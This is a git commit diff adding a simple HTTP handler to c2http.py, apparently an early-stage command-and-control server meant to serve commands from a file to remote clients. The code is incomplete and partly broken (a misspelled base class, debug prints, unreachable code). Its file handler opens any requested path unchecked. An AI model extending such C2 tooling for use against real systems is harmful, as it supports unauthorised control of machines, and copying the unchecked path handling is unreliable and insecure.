104606bf8fdd65925718969bf15057d0dd268f32
Mac Capello <sn8ke01.mac@gmail.com>
2018-08-30 12:55:08 -0500

    update c2http.py
    added web server handler

--- c2http.py
+++ c2http.py
@@ -1,10 +1,31 @@
+#!/usr/bin/python3
+
 # todo: listen for http packet requesting commands
 # todo: send commnds in an http packet
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+
+class server(BaseHTTPRequestHandlerx):
+	
+	def do_GET(self):
+		if self.path == '/':
+			self.path = '/cmd.html'
+		try:
+			file_to_open = open(self.path[1:]).read() #File containing cmds
+			self.send_response(200)
+		except:
+			file_to_open = "404 Error"
+			self.send_response(404)
+
+		self.end_headers()
+		self.wfile.write(bytes(file_to_open, 'utf-8'))
+
 
 def header():
     print('------------------')
     print(' c2http server')
     print('------------------')
+    print('0')
 
 
 def http_listener_service():
@@ -32,12 +53,19 @@ def display_cmd_ouput():
 
 
 def main():
-    header()
-    http_listener_service()
+    
+    '''header()'''
+    print('1')
+    httpd = HTTPServer(('localhost', 8080), server)
+    print('2')
+    httpd.serve_forever()
+    print("Server running....")
+'''
+    #http_listener_service()
     get_cmd()
     send_cmd()
     encode_cmd()
     decode_results()
     display_cmd_ouput()
-
+'''
 main()
